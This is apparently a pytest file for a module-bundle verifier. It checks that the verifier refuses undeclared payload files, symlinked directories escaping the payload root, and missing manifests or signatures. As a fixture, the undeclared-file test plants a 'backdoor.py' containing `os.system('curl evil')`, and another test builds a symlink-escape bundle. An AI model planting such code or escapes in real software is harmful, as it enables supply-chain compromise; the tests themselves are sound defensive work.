"""Verifier refusals that no other test reaches — the gates below the tamper cases.

`test_verify_fail_closed.py` covers the two refusals an operator expects: an
edited manifest and an edited payload file. Three more gates stand behind those,
and each one exists because the first two do not catch the attack:

* **Undeclared file.** Every declared file hashes correctly, so the content gate
  passes — and an extra `.py` rides into a module root the loader imports by
  path. Unverified code beside verified code is indistinguishable once both are
  materialized at `0444`.
* **Symlink escape.** The manifest path is clean and relative, so `FileEntry`
  admits it at parse time (that is what `security/test_bundle_path_traversal.py`
  pins). A symlinked *directory* inside the payload tree still lands the read
  outside the tree, and the bytes it reaches can hash exactly as declared. Only
  the post-resolve containment check refuses it.
* **A bundle missing its manifest or its signature.** Two different absences,
  two different refusals, and the signature case has to be attributable with no
  manifest parsed to name the module.

Every case asserts against a destination that already holds an installed
module, so "nothing was written" is a claim about existing bytes.
"""

from __future__ import annotations

import hashlib
import shutil
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest
from arctrust import AuditEvent
from packages.arcbundle.tests.conftest import BundleFactory

from arcbundle import (
    BundleContentHashError,
    BundleManifestError,
    BundleSignatureError,
    materialize,
    verify_bundle,
)

Snapshot = Callable[[Path], dict[str, bytes | None]]


class _CollectingSink:
    """Records what reached the sink, so a refusal's attribution can be read back."""

    def __init__(self) -> None:
        self.events: list[AuditEvent] = []

    def write(self, event: AuditEvent) -> None:
        self.events.append(event)


def _install(
    bundle: Path,
    dest: Path,
    *,
    tier: str,
    trusted: dict[str, bytes],
    sink: Any | None = None,
) -> Path:
    """The install path in miniature: verify first, write only after."""
    verified = verify_bundle(bundle, tier=tier, trusted_issuers=trusted, sink=sink)
    return materialize(verified, dest)


def test_undeclared_payload_file_is_refused_and_writes_nothing(
    tmp_path: Path,
    dest_root: Path,
    make_bundle: BundleFactory,
    snapshot_tree: Snapshot,
) -> None:
    """An extra file in the payload denies the whole bundle, not just itself.

    Nothing about this bundle is tampered: the manifest is genuine, its
    signature verifies, and every declared file hashes to what it declares. The
    stowaway is simply never mentioned — which is exactly how unverified code
    would arrive beside verified code if the sweep did not exist.
    """
    bundle = make_bundle(tmp_path / "browser.bundle")
    before = snapshot_tree(dest_root)

    stowaway = bundle.path / "files" / "tools" / "backdoor.py"
    stowaway.write_bytes(b"import os\nos.system('curl evil')\n")

    with pytest.raises(BundleContentHashError, match="undeclared file"):
        _install(bundle.path, dest_root, tier="personal", trusted=bundle.trusted())

    assert snapshot_tree(dest_root) == before
    assert not (dest_root / "browser").exists()


def test_symlinked_payload_directory_escaping_the_root_is_refused(
    tmp_path: Path,
    dest_root: Path,
    make_bundle: BundleFactory,
    snapshot_tree: Snapshot,
) -> None:
    """A clean relative path routed through a symlinked directory still escapes.

    The manifest declares ``vendor/evil.py`` — relative, no ``..``, accepted by
    ``FileEntry`` without complaint. The payload's ``vendor`` is then replaced
    with a link to a tree outside the bundle, so the read follows the link and
    lands on content the bundle does not contain.

    The planted file is the *same bytes* the manifest was signed over, so its
    digest matches and the content gate has nothing to say. If the containment
    check were absent, this bundle would verify.
    """
    smuggled = b"def evil():\n    return 'outside the payload root'\n"
    bundle = make_bundle(
        tmp_path / "browser.bundle",
        payload={
            "_runtime.py": b"def configure(agent):\n    return None\n",
            "vendor/evil.py": smuggled,
        },
    )
    before = snapshot_tree(dest_root)

    digest = hashlib.sha256(smuggled).hexdigest()
    assert digest.encode() in bundle.manifest_json.read_bytes(), (
        "the planted bytes must hash to what the manifest declares, or the content "
        "gate would refuse before the containment check is ever reached"
    )

    planted = tmp_path / "outside-the-bundle"
    shutil.move(str(bundle.path / "files" / "vendor"), str(planted))
    (bundle.path / "files" / "vendor").symlink_to(planted, target_is_directory=True)
    assert (bundle.path / "files" / "vendor" / "evil.py").read_bytes() == smuggled

    with pytest.raises(BundleContentHashError, match="escapes the payload root"):
        _install(bundle.path, dest_root, tier="personal", trusted=bundle.trusted())

    assert snapshot_tree(dest_root) == before
    assert not (dest_root / "browser").exists()


def test_bundle_without_a_manifest_is_refused_as_a_manifest_error(
    tmp_path: Path,
    dest_root: Path,
    make_bundle: BundleFactory,
    snapshot_tree: Snapshot,
) -> None:
    """An absent manifest is a manifest refusal, distinct from a signature one.

    The two absences have to stay distinguishable: an operator reading the
    refusal needs to know whether the description of the bundle is missing or
    the proof of it is.
    """
    bundle = make_bundle(tmp_path / "browser.bundle")
    before = snapshot_tree(dest_root)

    bundle.manifest_json.unlink()

    with pytest.raises(BundleManifestError, match="cannot read"):
        _install(bundle.path, dest_root, tier="personal", trusted=bundle.trusted())

    assert snapshot_tree(dest_root) == before
    assert not (dest_root / "browser").exists()


def test_bundle_without_a_signature_is_refused_and_audited_as_unknown(
    tmp_path: Path,
    dest_root: Path,
    make_bundle: BundleFactory,
    snapshot_tree: Snapshot,
) -> None:
    """An unsigned bundle denies, and the record names what it could not establish.

    This refusal fires before the manifest is parsed, so the emitter has no
    module and no issuer to attribute the denial to. Recording ``unknown`` for
    both is the honest answer; dropping the keys would leave an auditor to guess
    why a deny event is shaped differently from every other deny event.
    """
    bundle = make_bundle(tmp_path / "browser.bundle")
    before = snapshot_tree(dest_root)
    sink = _CollectingSink()

    bundle.signature.unlink()

    with pytest.raises(BundleSignatureError, match="cannot read"):
        _install(bundle.path, dest_root, tier="federal", trusted=bundle.trusted(), sink=sink)

    assert snapshot_tree(dest_root) == before
    assert not (dest_root / "browser").exists()

    assert [event.action for event in sink.events] == ["module.signature_invalid"]
    denied = sink.events[0]
    assert denied.outcome == "deny"
    assert denied.target == "unknown"
    assert denied.extra["issuer"] == "unknown"
